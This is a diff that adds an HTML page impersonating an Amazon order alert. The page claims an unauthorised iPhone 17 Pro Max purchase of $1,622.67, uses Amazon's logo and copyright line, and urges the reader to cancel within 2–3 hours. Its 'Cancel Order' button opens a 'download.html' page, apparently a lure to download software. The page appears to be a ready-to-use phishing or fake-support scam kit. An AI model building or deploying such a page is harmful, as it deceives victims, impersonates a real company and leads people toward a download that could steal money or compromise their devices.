@@ -1,0 +1,255 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Order Cancellation</title>
+
+<style>
+:root {
+  --accent: #ff9900;
+  --primary: #2b7cff;
+  --bg: #f5f7fa;
+  --card: #ffffff;
+  --text: #222;
+}
+
+/* RESET */
+* {
+  box-sizing: border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body {
+  margin: 0;
+  background: linear-gradient(135deg,#eef2f7,#f9fbfd);
+  color: var(--text);
+}
+
+/* HEADER */
+header {
+  background: white;
+  padding: 18px 0;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+}
+
+.logo {
+  height: 60px;
+  object-fit: contain;
+}
+
+/* ALERT STRIP */
+.alert {
+  background: #e8f3ff;
+  color: #0b57d0;
+  text-align: center;
+  padding: 16px;
+  font-size: 17px;
+  border-bottom: 1px solid #d6e6ff;
+}
+
+/* CONTAINER */
+.container {
+  max-width: 920px;
+  margin: 40px auto;
+  padding: 0 18px;
+}
+
+/* CARD */
+.card {
+  background: var(--card);
+  border-radius: 14px;
+  box-shadow: 0 18px 40px rgba(0,0,0,0.08);
+  padding: 32px;
+}
+
+/* TITLE */
+h1 {
+  margin-top: 0;
+  font-size: 30px;   /* Bigger */
+}
+
+.subtitle {
+  color: #666;
+  margin-bottom: 25px;
+  font-size: 17px;   /* Bigger */
+  line-height: 1.6;
+}
+
+/* ORDER BOX */
+.order-box {
+  border: 1px solid #e3e6ea;
+  border-radius: 10px;
+  padding: 22px;
+  background: #fafbfc;
+}
+
+.order-row {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 14px;
+  font-size: 17px;   /* Bigger */
+}
+
+.order-row strong {
+  color: #555;
+  font-size: 17px;
+}
+
+/* DELIVERY STATUS */
+.status {
+  margin-top: 24px;
+  padding: 20px;
+  background: #f0f7ff;
+  border-left: 5px solid var(--primary);
+  border-radius: 8px;
+  font-size: 17px;   /* Bigger */
+}
+
+.status strong {
+  color: var(--primary);
+}
+
+/* NOTICE */
+.notice {
+  margin-top: 20px;
+  padding: 18px;
+  background: #fff4e5;
+  border-left: 5px solid var(--accent);
+  border-radius: 8px;
+  font-size: 17px;   /* Bigger */
+}
+
+/* BUTTON */
+.actions {
+  margin-top: 32px;
+  text-align: center;
+}
+
+button {
+  background: linear-gradient(180deg,#ffb84d,#ff9900);
+  border: none;
+  padding: 20px 38px;
+  font-size: 20px;   /* Bigger */
+  font-weight: bold;
+  border-radius: 10px;
+  cursor: pointer;
+  box-shadow: 0 6px 0 #cc7a00;
+  transition: 0.15s;
+}
+
+button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 0 #cc7a00;
+}
+
+button:active {
+  transform: translateY(2px);
+  box-shadow: 0 3px 0 #cc7a00;
+}
+
+/* FOOTER */
+.footer {
+  margin-top: 26px;
+  text-align: center;
+  font-size: 13px;
+  color: #777;
+}
+
+/* MOBILE */
+@media (max-width:600px){
+  .card {
+    padding: 22px;
+  }
+  button {
+    width: 100%;
+  }
+}
+</style>
+<meta name="GENERATOR" content="MSHTML 11.00.10570.1001"></head>
+
+<body>
+
+<!-- HEADER -->
+<header>
+  <!-- Replace logo if needed -->
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg">
+</header>
+
+<!-- ALERT -->
+<div class="alert">
+  <strong>Order Activity Update</strong>
+</div>
+
+<div class="container">
+  <div class="card">
+
+    <h1>Order Placed on Your Account</h1>
+
+    <div class="subtitle">
+      An order has recently been placed using your account.
+      If you did not intend to proceed with this purchase,
+      you may cancel it within the available time window.
+    </div>
+
+    <!-- ORDER DETAILS -->
+    <div class="order-box">
+
+      <div class="order-row">
+        <strong>Order ID</strong>
+        <span>#402-9384756-1192834</span>
+      </div>
+
+      <div class="order-row">
+        <strong>Product</strong>
+        <span>iPhone 17 Pro Max</span>
+      </div>
+
+      <div class="order-row">
+        <strong>Order Amount</strong>
+        <span>$1,622.67</span>
+      </div>
+
+      <div class="order-row">
+        <strong>Payment Status</strong>
+        <span>Processed</span>
+      </div>
+
+    </div>
+
+    <!-- DELIVERY STATUS -->
+    <div class="status">
+      🚚 <strong>Out for Delivery</strong><br><br>
+      Your order is currently being processed for shipment and is
+      expected to arrive within <strong>7 days</strong>.
+    </div>
+
+    <!-- NOTICE -->
+    <div class="notice">
+      You may cancel this order within the next
+      <strong>2–3 hours</strong> before shipment processing is finalized.
+      Once dispatched, cancellation may no longer be available.
+    </div>
+
+    <!-- BUTTON -->
+    <div class="actions">
+      <button onclick="openCancelLink()">
+        Cancel Order
+      </button>
+    </div>
+
+    <div class="footer">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ©2026 Amazon.com, Inc. or its affiliates. All rights reserved.<br></div>
+
+  </div>
+</div>
+
+<!-- SCRIPT -->
+<script>
+function openCancelLink() {
+  window.open("download.html", "_blank");
+}
+</script>
+
+
+
+</body></html>
